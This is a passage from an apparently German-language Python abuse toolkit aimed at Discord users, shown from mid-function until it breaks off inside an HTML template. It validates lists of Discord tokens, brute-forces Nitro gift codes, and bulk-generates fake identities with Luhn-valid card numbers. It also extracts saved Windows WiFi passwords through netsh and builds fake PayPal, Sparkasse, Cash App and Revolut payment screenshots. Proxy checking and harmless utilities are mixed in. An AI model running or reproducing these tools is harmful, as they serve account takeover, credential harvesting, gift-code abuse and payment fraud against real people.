            r = requests.get(f"{DISCORD_API}/users/@me", headers={"Authorization":t}, timeout=10)
            if r.status_code == 200:
                d = r.json(); log("VALID", f"{G}{d.get('username')} | {d.get('email')}{RST}", G)
                save_hit("valid_tokens", f"{t} | {d.get('username')} | {d.get('email')}"); valid += 1
            else: log("DEAD", f"{R}{t[:30]}...{RST}", R); invalid += 1
        except: pass
        time.sleep(0.5)
    print(f"\n{G}Valid: {valid}   {R}Invalid: {invalid}{RST}"); pause()

# ═══════════════════════════════════════════════════════════════
# 11) USER ID LOOKUP
# ═══════════════════════════════════════════════════════════════
def id_lookup():
    clear(); print_banner()
    print(f"{M}{B}» Discord User ID Lookup{RST}\n")
    uid = ask("User ID: "); token = ask("Dein Token: ")
    if not token: log("ERR","token nötig",R); pause(); return
    prefix = "Bot " if ask("Bot token? (y/N): ","n").lower() == "y" else ""
    try:
        r = requests.get(f"{DISCORD_API}/users/{uid}", headers={"Authorization":prefix+token}, timeout=10)
        if r.status_code == 200: print(f"\n{G}{json.dumps(r.json(), indent=2)}{RST}")
        else: log("ERR", f"status {r.status_code}", R)
    except Exception as e: log("ERR", str(e), R)
    pause()

# ═══════════════════════════════════════════════════════════════
# 12) IP GENERATOR
# ═══════════════════════════════════════════════════════════════
COUNTRY_RANGES = {
    "US":[("3.0.0.0","3.255.255.255"),("50.0.0.0","50.255.255.255"),("64.0.0.0","64.255.255.255")],
    "DE":[("46.0.0.0","46.255.255.255"),("91.0.0.0","91.255.255.255"),("217.0.0.0","217.255.255.255")],
    "UK":[("25.0.0.0","25.255.255.255"),("81.128.0.0","81.191.255.255")],
    "RU":[("5.8.0.0","5.61.255.255"),("46.16.0.0","46.63.255.255")],
    "JP":[("14.0.0.0","14.255.255.255"),("122.0.0.0","122.255.255.255")],
    "FR":[("2.0.0.0","2.15.255.255"),("77.128.0.0","77.159.255.255")],
    "RANDOM":None,
}
def ip_generator():
    clear(); print_banner()
    print(f"{M}{B}» IP Generator{RST}\n")
    for i,c in enumerate(COUNTRY_RANGES.keys(), 1): print(f"  {C}{i}{RST}) {c}")
    choice = ask("\nWahl [7=RANDOM]: ","7")
    try: country = list(COUNTRY_RANGES.keys())[int(choice)-1]
    except: country = "RANDOM"
    count = int(ask("Anzahl [10]: ","10"))
    lookup = ask("Geo-lookup? (Y/n): ","y").lower() != "n"
    print()
    def _ip(s,e):
        def i(x): return sum(int(a)<<(8*(3-j)) for j,a in enumerate(x.split(".")))
        def to(n): return ".".join(str((n>>(8*(3-j)))&0xFF) for j in range(4))
        return to(random.randint(i(s),i(e)))
    for _ in range(count):
        if country == "RANDOM": ip = ".".join(str(random.randint(1,254)) for _ in range(4))
        else: ip = _ip(*random.choice(COUNTRY_RANGES[country]))
        if lookup:
            try:
                g = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp", timeout=5).json()
                if g.get("status") == "success":
                    print(f"{G}{B}{ip:<16}{RST} {C}{g.get('country'):<15}{RST} {Y}{g.get('city','?'):<15}{RST} {DIM}{g.get('isp','?')[:40]}{RST}")
                    save_hit("generated_ips", f"{ip} | {g.get('country')} | {g.get('city')} | {g.get('isp')}")
                else: print(f"{R}{ip:<16}{RST} {Y}reserved{RST}"); save_hit("generated_ips", ip)
                time.sleep(0.3)
            except: print(f"{G}{ip}{RST}")
        else: print(f"{G}{ip}{RST}"); save_hit("generated_ips", ip)
    pause()

# ═══════════════════════════════════════════════════════════════
# 13) NITRO GEN
# ═══════════════════════════════════════════════════════════════
def nitro_gen():
    clear(); print_banner()
    print(f"{M}{B}» Nitro Code Gen{RST}\n")
    n = int(ask("Anzahl [50]: ","50"))
    check = ask("Check? (y/N): ","n").lower() == "y"
    chars = string.ascii_letters + string.digits; valid = 0
    for _ in range(n):
        code = "".join(random.choices(chars, k=16))
        url = f"https://discord.gift/{code}"
        if check:
            try:
                r = requests.get(f"{DISCORD_API}/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true", timeout=10)
                if r.status_code == 200: log("VALID", f"{G}{url}{RST}", G); save_hit("nitro_valid", url); valid += 1
                else: print(f"{R}[FAKE]{RST} {url}")
            except: pass
            time.sleep(1)
        else: print(f"{C}{url}{RST}"); save_hit("nitro_generated", url)
    if check: print(f"\n{G}Valid: {valid}/{n}{RST}")
    pause()

# ═══════════════════════════════════════════════════════════════
# 14) IP LOOKUP
# ═══════════════════════════════════════════════════════════════
def ip_lookup():
    clear(); print_banner()
    print(f"{M}{B}» IP / Domain Lookup{RST}\n")
    ip = ask("IP oder domain: ")
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=66846719", timeout=10).json()
        for k,v in r.items(): print(f"{C}{k:<15}{RST}: {G}{v}{RST}")
    except Exception as e: log("ERR", str(e), R)
    pause()

# ═══════════════════════════════════════════════════════════════
# ★ NEW: 15) FAKE IDENTITY GENERATOR
# ═══════════════════════════════════════════════════════════════
def fake_identity():
    clear(); print_banner()
    print(f"{M}{B}» Fake Identity Generator{RST}")
    print(f"{W}   Komplette fake person: name, mail, adresse, cc, etc.{RST}\n")
    mode = ask("Mode: (1) einzeln anzeigen  (2) bulk CSV export [1]: ","1")
    if mode == "2":
        count = int(ask("Anzahl [100]: ","100"))
        print(f"\n{Y}[*] fetche {count} identities...{RST}")
        import csv
        fname = os.path.join(HITS_DIR, f"identities_{int(time.time())}.csv")
        with open(fname, "w", newline="", encoding="utf-8") as f:
            w = csv.writer(f)
            w.writerow(["first","last","gender","dob","age","email","phone","cell",
                       "street","city","state","postcode","country","username","password",
                       "cc_number","cc_exp","cc_cvv"])
            fetched = 0
            def luhn(n):
                s=0
                for i,d in enumerate(reversed(n)):
                    d=int(d)
                    if i%2==1: d*=2; d=d-9 if d>9 else d
                    s+=d
                return (10-s%10)%10
            while fetched < count:
                batch = min(200, count - fetched)
                try:
                    r = requests.get(f"https://randomuser.me/api/?results={batch}&nat=us,de,gb,fr", timeout=30).json()
                    for u in r["results"]:
                        cc_base = "4" + "".join(str(random.randint(0,9)) for _ in range(14))
                        cc = cc_base + str(luhn(cc_base))
                        l = u["location"]
                        w.writerow([
                            u["name"]["first"], u["name"]["last"], u["gender"],
                            u["dob"]["date"][:10], u["dob"]["age"],
                            u["email"], u["phone"], u["cell"],
                            f"{l['street']['number']} {l['street']['name']}",
                            l["city"], l["state"], l["postcode"], l["country"],
                            u["login"]["username"], u["login"]["password"],
                            cc, f"{random.randint(1,12):02d}/{random.randint(26,32)}", random.randint(100,999),
                        ])
                        fetched += 1
                        print(f"\r{G}[+] {fetched}/{count}{RST}", end="", flush=True)
                except Exception as e:
                    log("ERR", str(e), R); break
        print(f"\n\n{G}{B}[+] CSV gespeichert: {fname}{RST}")
        print(f"{DIM}    → in Excel/Sheets öffnen mit spalten-header{RST}")
        pause(); return

    count = int(ask("Anzahl [1]: ","1"))
    for _ in range(count):
        try:
            r = requests.get("https://randomuser.me/api/?nat=us,de,gb,fr", timeout=10).json()
            u = r["results"][0]
            # fake credit card (Luhn valid)
            def luhn(n):
                s = 0
                for i,d in enumerate(reversed(n)):
                    d = int(d)
                    if i % 2 == 1: d *= 2; d = d - 9 if d > 9 else d
                    s += d
                return (10 - s % 10) % 10
            cc_base = "4" + "".join(str(random.randint(0,9)) for _ in range(14))
            cc = cc_base + str(luhn(cc_base))
            cc_fmt = " ".join(cc[i:i+4] for i in range(0,16,4))

            print(f"\n{G}{B}╔══════════════════════════════════════════╗{RST}")
            print(f"{G}{B}║          FAKE IDENTITY               🎭 ║{RST}")
            print(f"{G}{B}╚══════════════════════════════════════════╝{RST}")
            print(f"{C}Name:{RST}     {W}{B}{u['name']['title']}. {u['name']['first']} {u['name']['last']}{RST}")
            print(f"{C}Gender:{RST}   {W}{u['gender']}{RST}")
            print(f"{C}DOB:{RST}      {W}{u['dob']['date'][:10]} (age {u['dob']['age']}){RST}")
            print(f"{C}Email:{RST}    {Y}{u['email']}{RST}")
            print(f"{C}Phone:{RST}    {Y}{u['phone']}{RST}")
            print(f"{C}Mobile:{RST}   {Y}{u['cell']}{RST}")
            l = u['location']
            print(f"{C}Address:{RST}  {W}{l['street']['number']} {l['street']['name']}{RST}")
            print(f"          {W}{l['city']}, {l['state']} {l['postcode']}{RST}")
            print(f"          {W}{l['country']}{RST}")
            print(f"{C}Login:{RST}    user={Y}{u['login']['username']}{RST} pw={Y}{u['login']['password']}{RST}")
            print(f"{C}CC (fake):{RST} {Y}{cc_fmt}{RST} exp={random.randint(1,12):02d}/{random.randint(26,32)} cvv={random.randint(100,999)}")
            print(f"{C}Avatar:{RST}   {DIM}{u['picture']['large']}{RST}")
            save_hit("fake_identities", json.dumps({"name":f"{u['name']['first']} {u['name']['last']}",
                "email":u['email'],"phone":u['phone'],"address":f"{l['street']['number']} {l['street']['name']}, {l['city']}",
                "cc":cc_fmt}))
        except Exception as e: log("ERR", str(e), R); break
    pause()

# ═══════════════════════════════════════════════════════════════
# ★ NEW: 16) PASSWORD GENERATOR + STRENGTH CHECKER
# ═══════════════════════════════════════════════════════════════
def password_tools():
    clear(); print_banner()
    print(f"{M}{B}» Password & Username Tools{RST}\n")
    print(f"  {C}1{RST}) Generate strong password")
    print(f"  {C}2{RST}) Check password strength")
    print(f"  {C}3{RST}) Check if password is in leaked list (HIBP)")
    print(f"  {C}4{RST}) {G}Generate usernames ★{RST}")
    choice = ask("\nWahl: ")
    if choice == "1":
        length = int(ask("Länge [20]: ","20"))
        count = int(ask("Anzahl [5]: ","5"))
        chars = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?"
        print()
        for _ in range(count):
            pw = "".join(random.SystemRandom().choice(chars) for _ in range(length))
            print(f"  {G}{B}{pw}{RST}")
            save_hit("generated_passwords", pw)
    elif choice == "2":
        pw = ask("Password: ")
        score = 0; issues = []
        if len(pw) >= 8: score += 1
        else: issues.append("zu kurz (<8)")
        if len(pw) >= 12: score += 1
        if len(pw) >= 16: score += 1
        if any(c.islower() for c in pw): score += 1
        else: issues.append("keine kleinbuchstaben")
        if any(c.isupper() for c in pw): score += 1
        else: issues.append("keine großbuchstaben")
        if any(c.isdigit() for c in pw): score += 1
        else: issues.append("keine zahlen")
        if any(c in "!@#$%^&*()_+-=[]{}|;:,.<>?" for c in pw): score += 1
        else: issues.append("keine sonderzeichen")
        entropy = len(pw) * 6.5
        strength = ["SEHR SCHWACH","SCHWACH","MITTEL","STARK","SEHR STARK","BULLETPROOF"][min(score//2,5)]
        color = [R,R,Y,G,G,G][min(score//2,5)]
        print(f"\n{C}Score:{RST}    {color}{B}{score}/7{RST}")
        print(f"{C}Stärke:{RST}   {color}{B}{strength}{RST}")
        print(f"{C}Entropy:{RST}  ~{entropy:.0f} bits")
        if issues: print(f"{C}Issues:{RST}   {R}{', '.join(issues)}{RST}")
    elif choice == "3":
        pw = ask("Password: ")
        import hashlib
        h = hashlib.sha1(pw.encode()).hexdigest().upper()
        prefix, suffix = h[:5], h[5:]
        try:
            r = requests.get(f"https://api.pwnedpasswords.com/range/{prefix}", timeout=10)
            hits = [line for line in r.text.splitlines() if line.startswith(suffix)]
            if hits:
                count = int(hits[0].split(":")[1])
                print(f"\n{R}{B}[!] LEAKED — {count:,}x in bekannten breaches{RST}")
                print(f"{Y}   → NIEMALS verwenden!{RST}")
            else:
                print(f"\n{G}[✓] NOT in any known breach — sicher zu verwenden{RST}")
        except Exception as e: log("ERR", str(e), R)
    elif choice == "4":
        # username generator
        length = int(ask("Länge [8]: ", "8"))
        count = int(ask("Anzahl [20]: ", "20"))
        use_digits = ask("Zahlen drin? (Y/n): ", "y").lower() != "n"
        use_special = ask("Sonderzeichen drin? (y/N): ", "n").lower() == "y"
        style = ask("Style: (1) random  (2) readable/word-like  [1]: ", "1")

        chars = string.ascii_lowercase
        if use_digits: chars += string.digits
        if use_special: chars += "_.-"

        # für readable: konsonanten + vokale abwechselnd
        CONS = "bcdfghjklmnpqrstvwxyz"
        VOW = "aeiou"

        print()
        for _ in range(count):
            if style == "2":
                name = ""
                for i in range(length):
                    name += random.choice(VOW if i % 2 else CONS)
                if use_digits and random.random() < 0.4:
                    name = name[:-1] + str(random.randint(0,9))
            else:
                name = "".join(random.SystemRandom().choice(chars) for _ in range(length))
            print(f"  {G}{name}{RST}")
            save_hit("generated_usernames", name)
        print(f"\n{DIM}  → gespeichert in hits/generated_usernames.txt{RST}")
    pause()

# ═══════════════════════════════════════════════════════════════
# ★ NEW: 17) WIFI PASSWORD EXTRACTOR (Windows)
# ═══════════════════════════════════════════════════════════════
def wifi_extractor():
    clear(); print_banner()
    print(f"{M}{B}» WiFi Password Extractor (lokal, Windows){RST}")
    print(f"{W}   Extrahiert alle gespeicherten WiFi passwörter von diesem PC.{RST}\n")
    if os.name != "nt":
        log("ERR","nur Windows",R); pause(); return
    try:
        result = subprocess.check_output(["netsh","wlan","show","profiles"], text=True, errors="ignore")
        profiles = re.findall(r"All User Profile\s*:\s*(.+)", result)
        profiles += re.findall(r"Profil für alle Benutzer\s*:\s*(.+)", result)
        if not profiles:
            print(f"{Y}[!] keine WiFi profile gefunden{RST}"); pause(); return
        print(f"{G}[+] {len(profiles)} profile gefunden{RST}\n")
        found = []
        for p in profiles:
            p = p.strip()
            try:
                detail = subprocess.check_output(["netsh","wlan","show","profile",f"name={p}","key=clear"], text=True, errors="ignore")
                pw_match = re.search(r"Key Content\s*:\s*(.+)|Schlüsselinhalt\s*:\s*(.+)", detail)
                pw = None
                if pw_match: pw = (pw_match.group(1) or pw_match.group(2) or "").strip()
                if pw:
                    print(f"  {C}SSID:{RST} {G}{B}{p:<30}{RST} {C}PW:{RST} {Y}{B}{pw}{RST}")
                    found.append((p,pw)); save_hit("wifi_passwords", f"{p} : {pw}")
                else:
                    print(f"  {C}SSID:{RST} {W}{p:<30}{RST} {DIM}(kein passwort / open){RST}")
            except: pass
        print(f"\n{G}[+] {len(found)} passwörter extrahiert{RST}")
        print(f"{DIM}    → gespeichert in hits/wifi_passwords.txt{RST}")
    except Exception as e: log("ERR", str(e), R)
    pause()

# ═══════════════════════════════════════════════════════════════
# ★ NEW: 18) FILE HASH GENERATOR
# ═══════════════════════════════════════════════════════════════
def file_hasher():
    clear(); print_banner()
    print(f"{M}{B}» File Hash Generator{RST}\n")
    path = ask("Pfad zur datei: ").strip('"')
    if not os.path.exists(path): log("ERR","nicht gefunden",R); pause(); return
    import hashlib
    size = os.path.getsize(path)
    print(f"\n{C}File:{RST}    {W}{path}{RST}")
    print(f"{C}Size:{RST}    {W}{size:,} bytes ({size/1024/1024:.2f} MB){RST}\n")
    for algo in ["md5","sha1","sha256","sha512"]:
        h = hashlib.new(algo)
        with open(path, "rb") as f:
            for chunk in iter(lambda: f.read(65536), b""): h.update(chunk)
        print(f"{C}{algo.upper():<7}{RST}: {G}{h.hexdigest()}{RST}")
    pause()

# ═══════════════════════════════════════════════════════════════
# ★ 19) QR CODE GENERATOR
# ═══════════════════════════════════════════════════════════════
def qr_generator():
    clear(); print_banner()
    print(f"{M}{B}» QR Code Generator{RST}")
    print(f"{W}   Text/URL → QR code als PNG + ASCII im terminal.{RST}\n")
    data = ask("Text oder URL: ")
    if not data: return
    size = ask("Size: (1) small  (2) medium  (3) large  [2]: ", "2")
    px = {"1":150,"2":300,"3":500}.get(size, 300)

    # ASCII im terminal
    try:
        import qrcode
        qr = qrcode.QRCode(border=1, box_size=1)
        qr.add_data(data); qr.make(fit=True)
        matrix = qr.get_matrix()
        print(f"\n{W}{B}─── ASCII QR ───{RST}\n")
        for row in matrix:
            print("".join("██" if cell else "  " for cell in row))
    except ImportError:
        print(f"{Y}[*] installiere qrcode lib...{RST}")
        try: subprocess.check_call([sys.executable,"-m","pip","install","qrcode"])
        except: pass

    # PNG via API
    try:
        api = f"https://api.qrserver.com/v1/create-qr-code/?size={px}x{px}&data={requests.utils.quote(data)}"
        r = requests.get(api, timeout=15)
        if r.status_code == 200:
            fname = os.path.join(HITS_DIR, f"qr_{int(time.time())}.png")
            with open(fname, "wb") as f: f.write(r.content)
            print(f"\n{G}[+] PNG gespeichert: {fname}{RST}")
            print(f"{C}[+] Auch als link: {api}{RST}")
            save_hit("qr_codes", f"{data} → {fname}")
    except Exception as e: log("ERR", str(e), R)
    pause()

# ═══════════════════════════════════════════════════════════════
# ★ 20) TEXT TOOLKIT (encoding/decoding/hashing)
# ═══════════════════════════════════════════════════════════════
MORSE = {'A':'.-','B':'-...','C':'-.-.','D':'-..','E':'.','F':'..-.','G':'--.',
'H':'....','I':'..','J':'.---','K':'-.-','L':'.-..','M':'--','N':'-.','O':'---',
'P':'.--.','Q':'--.-','R':'.-.','S':'...','T':'-','U':'..-','V':'...-','W':'.--',
'X':'-..-','Y':'-.--','Z':'--..','0':'-----','1':'.----','2':'..---','3':'...--',
'4':'....-','5':'.....','6':'-....','7':'--...','8':'---..','9':'----.',' ':'/'}
MORSE_REV = {v:k for k,v in MORSE.items()}

def text_toolkit():
    clear(); print_banner()
    print(f"{M}{B}» Text Toolkit{RST}\n")
    print(f"  {C}1{RST}) Base64 encode      {C} 2{RST}) Base64 decode")
    print(f"  {C}3{RST}) Hex encode         {C} 4{RST}) Hex decode")
    print(f"  {C}5{RST}) URL encode         {C} 6{RST}) URL decode")
    print(f"  {C}7{RST}) ROT13              {C} 8{RST}) Reverse")
    print(f"  {C}9{RST}) Morse encode       {C}10{RST}) Morse decode")
    print(f" {C}11{RST}) All hashes (md5/sha1/sha256/sha512)")
    print(f" {C}12{RST}) Discord Token → User ID")
    choice = ask("\nWahl: ")
    text = ask("Input: ")
    import hashlib, urllib.parse, codecs
    try:
        if choice == "1": r = base64.b64encode(text.encode()).decode()
        elif choice == "2": r = base64.b64decode(text).decode(errors="replace")
        elif choice == "3": r = text.encode().hex()
        elif choice == "4": r = bytes.fromhex(text).decode(errors="replace")
        elif choice == "5": r = urllib.parse.quote(text)
        elif choice == "6": r = urllib.parse.unquote(text)
        elif choice == "7": r = codecs.encode(text, "rot13")
        elif choice == "8": r = text[::-1]
        elif choice == "9": r = " ".join(MORSE.get(c.upper(),"?") for c in text)
        elif choice == "10": r = "".join(MORSE_REV.get(c,"?") for c in text.split())
        elif choice == "11":
            r = ""
            for algo in ["md5","sha1","sha256","sha512"]:
                r += f"{C}{algo.upper():<7}{RST}: {G}{hashlib.new(algo, text.encode()).hexdigest()}{RST}\n"
        elif choice == "12":
            part = text.split(".")[0]
            part += "=" * (-len(part) % 4)
            r = base64.b64decode(part).decode()
        else: r = "invalid choice"
        print(f"\n{G}{B}Result:{RST}\n{r}")
    except Exception as e: log("ERR", str(e), R)
    pause()

# ═══════════════════════════════════════════════════════════════
# ★ 21) PROXY CHECKER
# ═══════════════════════════════════════════════════════════════
def proxy_checker():
    clear(); print_banner()
    print(f"{M}{B}» Proxy Checker{RST}")
    print(f"{W}   Testet ne liste proxies ob sie live sind + speed.{RST}\n")
    src = ask("Source: (1) datei  (2) auto-fetch (~4000+) [2]: ", "2")
    proxies = []
    if src == "1":
        path = ask("Pfad: ").strip('"')
        try:
            with open(path) as f: proxies = [l.strip() for l in f if l.strip()]
        except: log("ERR","not found",R); pause(); return
    else:
        print(f"{Y}[*] fetche proxies...{RST}")
        proxies = fetch_proxies()
    if not proxies: log("ERR","keine proxies",R); pause(); return
    print(f"{G}[+] {len(proxies)} proxies zu testen{RST}\n")

    threads = int(ask("Threads [100]: ", "100"))
    timeout = float(ask("Timeout in s [5]: ", "5"))

    alive = []; dead = 0; lock = threading.Lock()
    q = Queue()
    for p in proxies: q.put(p)

    def worker():
        nonlocal dead
        while True:
            try: proxy = q.get(timeout=1)
            except: return
            start = time.time()
            try:
                r = requests.get("http://ip-api.com/json",
                    proxies={"http":f"http://{proxy}","https":f"http://{proxy}"},
                    timeout=timeout)
                if r.status_code == 200:
                    ms = int((time.time() - start) * 1000)
                    d = r.json()
                    with lock:
                        alive.append((proxy, ms, d.get("country")))
                        print(f"{G}[✓] {proxy:<22}{RST} {C}{ms}ms{RST}  {Y}{d.get('country','?')}{RST}")
                        save_hit("alive_proxies", proxy)
                else:
                    with lock: dead += 1
            except:
                with lock: dead += 1

    ths = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
    for t in ths: t.start()
    try:
        while any(t.is_alive() for t in ths): time.sleep(0.5)
    except KeyboardInterrupt: pass

    print(f"\n{G}{B}Alive: {len(alive)}  {R}Dead: {dead}{RST}")
    if alive:
        alive.sort(key=lambda x: x[1])
        print(f"\n{C}Top 5 schnellste:{RST}")
        for p, ms, cty in alive[:5]:
            print(f"  {G}{p:<22}{RST} {C}{ms}ms{RST} {Y}{cty}{RST}")
    pause()

# ═══════════════════════════════════════════════════════════════
# ★ 22) REVERSE IMAGE SEARCH
# ═══════════════════════════════════════════════════════════════
def reverse_image_search():
    clear(); print_banner()
    print(f"{M}{B}» Reverse Image Search{RST}")
    print(f"{W}   Bild hochladen → search links für Google, Yandex, TinEye, Bing.{RST}")
    print(f"{W}   Yandex ist am besten für gesichter, TinEye für exakte matches.{RST}\n")

    src = ask("(1) lokales bild  (2) image URL: ", "1")
    if src == "1":
        path = ask("Pfad zum bild: ").strip('"')
        if not os.path.exists(path): log("ERR","not found",R); pause(); return
        print(f"{Y}[*] upload zu catbox.moe...{RST}")
        try:
            with open(path, "rb") as f:
                r = requests.post("https://catbox.moe/user/api.php", files={
                    "reqtype":(None,"fileupload"),
                    "fileToUpload":(os.path.basename(path), f),
                }, timeout=60)
                if r.status_code != 200 or not r.text.startswith("https://"):
                    log("ERR", "upload failed", R); pause(); return
                img_url = r.text.strip()
                print(f"{G}[+] uploaded: {img_url}{RST}")
        except Exception as e: log("ERR", str(e), R); pause(); return
    else:
        img_url = ask("Image URL: ")

    from urllib.parse import quote
    enc = quote(img_url, safe="")
    print(f"\n{G}{B}Search links:{RST}\n")
    engines = {
        "🔍 Google Lens":  f"https://lens.google.com/uploadbyurl?url={enc}",
        "🇷🇺 Yandex":       f"https://yandex.com/images/search?rpt=imageview&url={enc}",
        "🎯 TinEye":       f"https://tineye.com/search?url={enc}",
        "🅱 Bing":          f"https://www.bing.com/images/search?view=detailv2&iss=sbi&form=SBIVSP&sbisrc=UrlPaste&q=imgurl:{enc}",
        "📸 SauceNAO":     f"https://saucenao.com/search.php?url={enc}",
        "🌐 ImgOps":       f"https://imgops.com/{img_url}",
    }
    for name, url in engines.items():
        print(f"  {C}{name}{RST}")
        print(f"    {Y}{url}{RST}\n")
    save_hit("reverse_image", img_url)
    print(f"{DIM}  → alle links kopieren + öffnen{RST}")
    pause()

# ═══════════════════════════════════════════════════════════════
# ★ 23) FAKE PAYMENT SCREENSHOT GENERATOR
# ═══════════════════════════════════════════════════════════════
def fake_payment():
    clear(); print_banner()
    print(f"{W}{B}» Fake Payment Screenshot (Mobile App Style){RST}")
    print(f"{DIM}   Sehen aus wie echte handy screenshots — 1:1 mobile UI{RST}")
    print(f"{DIM}   HTML öffnet als phone-frame, screenshot im browser{RST}\n")

    print(f"{C}App:{RST}")
    print(f"  {C}1{RST}) PayPal (mobile)")
    print(f"  {C}2{RST}) Sparkasse App (SEPA)")
    print(f"  {C}3{RST}) Cash App")
    print(f"  {C}4{RST}) Bitcoin (BlockChain wallet)")
    print(f"  {C}5{RST}) Revolut")
    print(f"  {C}6{RST}) PayPal (received money)")
    style = ask("\nWahl: ")

    amount = ask("Betrag (nur zahl): ", "1500")
    recipient = ask("Name (empfänger/sender): ", "Max Mustermann")
    currency = ask("Currency (EUR/USD/GBP): ","EUR").upper()
    curr_sym = {"EUR":"€","USD":"$","GBP":"£"}.get(currency, "€")
    now = datetime.now()
    tstamp = now.strftime("%b %d, %Y at %I:%M %p")

    # phone frame CSS wrapper (mobile-first)
    PHONE_WRAP = """<style>
body{margin:0;background:#1a1a1a;display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:-apple-system,BlinkMacSystemFont,'SF Pro Text','Segoe UI',sans-serif}
.phone{width:390px;min-height:844px;background:#fff;border-radius:52px;overflow:hidden;box-shadow:0 40px 100px rgba(0,0,0,.6);position:relative;border:12px solid #000}
.notch{position:absolute;top:0;left:50%;transform:translateX(-50%);width:120px;height:32px;background:#000;border-radius:0 0 20px 20px;z-index:100}
.statusbar{display:flex;justify-content:space-between;align-items:center;padding:14px 30px 6px;font-size:15px;font-weight:600;color:#000}
.statusbar .icons{display:flex;gap:5px;align-items:center;font-size:12px}
.phone.dark .statusbar{color:#fff}
</style>"""
    STATUSBAR_LIGHT = """<div class="statusbar"><span>9:41</span><span class="icons">●●●●● 5G 100</span></div>"""
    STATUSBAR_DARK = """<div class="statusbar" style="color:#fff"><span>9:41</span><span class="icons">●●●●● 5G 100</span></div>"""

    if style == "99":
        # Bitcoin (fallback — mobile block chain style)
        btc = float(amount) / 65000  # fake rate
        tx = "".join(random.choices("abcdef0123456789", k=64))
        html = f"""<!doctype html><html><head><meta charset="utf-8"><title>Bitcoin Transaction</title>
<style>body{{margin:0;padding:40px;background:#0d1117;color:#c9d1d9;font-family:-apple-system,'Segoe UI',sans-serif;min-height:100vh}}
.card{{max-width:600px;margin:40px auto;background:#161b22;border:1px solid #30363d;border-radius:12px;overflow:hidden}}
.hdr{{background:#f7931a;color:#fff;padding:24px;display:flex;align-items:center;gap:14px}}
.hdr h1{{font-size:22px;margin:0}}.hdr svg{{width:36px}}
.body{{padding:32px}}.status{{background:rgba(46,160,67,.15);color:#3fb950;padding:14px;border-radius:8px;text-align:center;font-weight:600;margin-bottom:24px;font-size:16px}}
.row{{display:flex;justify-content:space-between;padding:14px 0;border-bottom:1px solid #21262d;font-size:15px}}.row:last-child{{border:none}}
.k{{color:#8b949e}}.v{{color:#c9d1d9;font-weight:500;text-align:right;word-break:break-all}}
.amt{{text-align:center;font-size:38px;font-weight:700;color:#f7931a;margin:24px 0}}</style></head><body>
<div class="card">
<div class="hdr"><svg viewBox="0 0 24 24" fill="#fff"><path d="M12 0C5.4 0 0 5.4 0 12s5.4 12 12 12 12-5.4 12-12S18.6 0 12 0zm4.9 10.4c-.3 1.9-2 2.6-4.2 2.6l-.5 2.7h-1.6l.5-2.7c-.4 0-.9-.1-1.3-.1l-.5 2.7H8l.5-2.7c-.4 0-.7-.1-1.1-.1l-2 .1.4-2s1 .1 1 .1c.5 0 .6-.4.6-.6l1.1-6.1c0-.2-.1-.6-.6-.6h-1l.4-1.8 2.2.1c.4 0 .8-.1 1.3-.1l.5-2.6h1.6l-.5 2.6c.4 0 .9.1 1.3.1l.5-2.6h1.6l-.5 2.7c1.7.3 2.9 1 2.7 2.7-.1 1.2-.9 1.7-1.9 1.9 1.2.3 2 1.1 1.7 2.8zM14 8.1c.2-1.6-1.9-1.4-2.6-1.3l-.5 2.8c.7.1 2.9.5 3.1-1.5zm-.4 3.8c.2-1.7-2.3-1.5-3.1-1.4l-.6 3.1c.8.1 3.5.5 3.7-1.7z"/></svg><h1>Bitcoin</h1></div>
<div class="body">
<div class="status">✓ Transaction Confirmed · 6 confirmations</div>
<div class="amt">₿ {btc:.8f}</div>
<div class="row"><span class="k">Amount (USD)</span><span class="v">${amount}.00</span></div>
<div class="row"><span class="k">Recipient</span><span class="v">{recipient}</span></div>
<div class="row"><span class="k">Transaction ID</span><span class="v" style="font-family:monospace;font-size:12px">{tx}</span></div>
<div class="row"><span class="k">Network Fee</span><span class="v">₿ 0.00001234</span></div>
<div class="row"><span class="k">Date</span><span class="v">{tstamp}</span></div>
<div class="row"><span class="k">Status</span><span class="v" style="color:#3fb950">Confirmed</span></div>
</div></div></body></html>"""
    ref = "".join(random.choices("0123456789ABCDEF", k=17))
    ini = (recipient.split()[0][0] + (recipient.split()[-1][0] if len(recipient.split())>1 else "")).upper()

    if style == "1":
        # PayPal MOBILE 1:1
        html = f"""<!doctype html><html><head><meta charset="utf-8"><title>PayPal</title>{PHONE_WRAP}
<style>
.phone{{background:#f5f7fa}}
{STATUSBAR_LIGHT}
.header{{background:#003087;color:#fff;padding:20px 24px 24px;display:flex;align-items:center;gap:14px}}
.back{{font-size:22px}}
.ppl{{font-weight:900;font-style:italic;font-size:24px}}.ppl .al{{color:#009cde}}
.check-circle{{width:88px;height:88px;background:linear-gradient(135deg,#0070ba,#00c853);border-radius:50%;margin:36px auto 20px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:52px;font-weight:900;box-shadow:0 8px 24px rgba(0,112,186,.35)}}
.title{{text-align:center;font-size:20px;font-weight:600;color:#001c64;margin-bottom:6px;padding:0 24px}}
.subtitle{{text-align:center;color:#5a6b78;font-size:14px;padding:0 24px;margin-bottom:24px}}
.amount{{text-align:center;font-size:44px;font-weight:700;color:#001c64;margin:20px 0 8px}}
.currency{{text-align:center;color:#5a6b78;font-size:14px;margin-bottom:20px}}
.card{{background:#fff;margin:16px 20px;border-radius:16px;padding:18px 20px;box-shadow:0 2px 8px rgba(0,0,0,.04)}}
.person{{display:flex;align-items:center;gap:14px;padding:8px 0}}
.avatar{{width:52px;height:52px;background:#0070ba;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;font-size:18px}}
.person-info .name{{font-weight:600;font-size:15px;color:#001c64}}
.person-info .email{{color:#5a6b78;font-size:13px;margin-top:2px}}
.row{{display:flex;justify-content:space-between;padding:14px 0;border-top:1px solid #f0f2f5;font-size:14px}}
.row:first-of-type{{border:none}}
.k{{color:#5a6b78}}.v{{color:#001c64;font-weight:600;text-align:right}}
.done{{position:absolute;bottom:40px;left:20px;right:20px;background:#0070ba;color:#fff;text-align:center;padding:16px;border-radius:28px;font-weight:600;font-size:16px}}
</style></head><body><div class="phone">
<div class="notch"></div>{STATUSBAR_LIGHT}
<div class="header"><span class="back">←</span><div class="ppl">Pay<span class="al">Pal</span></div></div>
<div class="check-circle">✓</div>
<div class="title">Payment Sent</div>
